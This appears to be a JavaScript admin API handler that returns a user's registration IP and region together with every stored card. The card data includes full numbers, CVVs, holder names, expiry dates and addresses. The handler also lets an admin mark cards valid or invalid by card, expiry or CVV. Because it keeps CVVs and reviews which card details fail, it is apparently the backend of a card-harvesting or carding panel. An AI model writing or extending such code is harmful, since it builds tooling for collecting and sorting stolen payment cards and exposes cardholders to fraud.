import {db} from "../_lib/db.js";import {readCookie} from "../_lib/auth.js";
export default async function handler(req,res){const s=await readCookie(req,"admin_session");if(s?.role!=="admin")return res.status(401).json({error:"未授权"});const sql=db();
 if(req.method==="GET"){const uid=req.query.user_id;const u=await sql`select id,email,reg_ip,reg_region from users where id=${uid}`;if(!u.length)return res.status(404).json({error:"用户不存在"});const cards=await sql`select id,bank,last4,card_number,cvv,holder,expiry,address,network,status,invalid_reason,is_default,created_at from cards where user_id=${uid} and deleted_at is null order by created_at desc`;return res.json({user:u[0],cards})}
 if(req.method==="PATCH"){const {id,action,status,reasons}=req.body||{};if(action==="status"&&["valid","invalid"].includes(status)){
  const valid=["card","expiry","cvv"];
  const list=Array.isArray(reasons)?reasons.filter(r=>valid.includes(r)):[];
  const reason=status==="invalid"?list.join(","):"";
  await sql`update cards set status=${status},invalid_reason=${reason},is_default=case when ${status}='invalid' then false else is_default end where id=${id}`;
  return res.json({ok:true})
 }return res.status(400).json({error:"无效操作"})}
 if(req.method==="DELETE"){const {id}=req.body||{};await sql`update cards set deleted_at=now(),is_default=false where id=${id}`;return res.json({ok:true})}
 res.status(405).json({error:"Method not allowed"});
}